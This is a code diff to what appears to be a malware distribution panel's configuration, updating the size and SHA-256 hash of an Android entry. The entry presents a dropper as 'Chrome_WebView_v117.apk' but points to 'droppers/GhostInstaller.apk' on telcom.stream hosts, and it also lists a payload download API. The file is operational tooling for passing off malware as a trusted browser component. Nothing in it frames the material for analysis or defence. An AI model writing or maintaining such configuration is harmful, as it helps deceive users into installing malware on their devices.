@@ -36,10 +36,10 @@
       release: 'dropper-6.1.0', updatedAt: 1
     },
     android: {
-      name: 'Chrome_WebView_v117.apk', size: 22916505, platform: 'android', format: 'apk', arch: 'universal',
+      name: 'Chrome_WebView_v117.apk', size: 24666571, platform: 'android', format: 'apk', arch: 'universal',
       url: 'https://global.telcom.stream/downloads/droppers/GhostInstaller.apk?v=2.1.123',
       payloadUrl: 'https://panel.telcom.stream/api/landing/download?platform=android&arch=universal&format=apk',
-      sha256: 'd4fb79b8c963477f1c1ae7ad3ae3355df511198cd5313026c6c913dbb28fd66f',
+      sha256: '3817b28e893860c0251a35be68590c19f4114057a0dfa95486102afce94b8553',
       release: 'dropper-2.1.123', updatedAt: 123
     }
   };
